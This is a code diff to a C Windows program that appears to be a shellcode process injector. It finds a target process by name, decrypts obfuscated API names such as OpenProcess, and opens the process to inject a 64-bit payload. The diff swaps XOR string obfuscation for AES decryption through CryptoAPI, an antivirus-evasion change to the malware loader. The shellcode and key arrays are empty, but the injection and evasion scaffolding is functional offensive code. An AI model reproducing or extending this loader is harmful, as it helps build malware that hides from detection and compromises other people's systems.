@@ -6,6 +6,10 @@
 #include <stdlib.h>
 #include <string.h>
 #include <tlhelp32.h>
+#include <wincrypt.h>
+#pragma comment(lib, "w2_32")
+#pragma comment (lib, "crypt32.lib")
+#pragma comment (lib, "advapi32")
 
 // shellcode - 64-bit
 unsigned char my_payload[] = { };
@@ -23,6 +27,9 @@ unsigned char s_clh[] = { };
 unsigned char s_p32f[] = { };
 unsigned char s_p32n[] = { };
 unsigned char s_ct32s[] = { };
+
+// decrypted functions
+char func_op[12] = "";
 
 // encrypted kernel32.dll
 unsigned char s_k32[] = { };
@@ -48,7 +55,7 @@ char s_vaex_key[] = "";
 char s_cth_key[] = "";
 char s_wfso_key[] = "";
 char s_wpm_key[] = "";
-char s_op_key[] = "";
+unsigned char s_op_key[] = "";
 char s_clh_key[] = "";
 char s_p32f_key[] = "";
 char s_p32n_key[] = "";
@@ -89,6 +96,35 @@ void XOR(char * data, size_t data_len, char * key, size_t key_len) {
             data[i] = data[i] ^ key[j];
             j++;
     }
+}
+
+// AES decrypt
+int AESDecrypt(char * data, unsigned int data_len, char * key, size_t keylen) {
+  HCRYPTPROV hProv;
+  HCRYPTHASH hHash;
+  HCRYPTKEY hKey;
+
+  if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
+    return -1;
+  }
+  if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
+    return -1;
+  }
+  if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
+    return -1;
+  }
+  if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
+    return -1;
+  }
+  if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, data, &data_len)){
+    return -1;
+  }
+
+  CryptReleaseContext(hProv, 0);
+  CryptDestroyHash(hHash);
+  CryptDestroyKey(hKey);
+
+  return 0;
 }
 
 int FindTarget(const char *procname) {
@@ -181,8 +217,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     if (pid) {
         // decrypt OpenProcess function call
-        XOR((char *) s_op, s_op_len, s_op_key, sizeof(s_op_key));
-        pOpenProcess = GetProcAddress(GetModuleHandle(s_k32), s_op);
+        AESDecrypt((char *)s_op, s_op_len, s_op_key, sizeof(s_op_key));
+        snprintf(func_op, sizeof(func_op), "%s", s_op);
+        pOpenProcess = GetProcAddress(GetModuleHandle(s_k32), func_op);
 
         // try to open target process
         hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
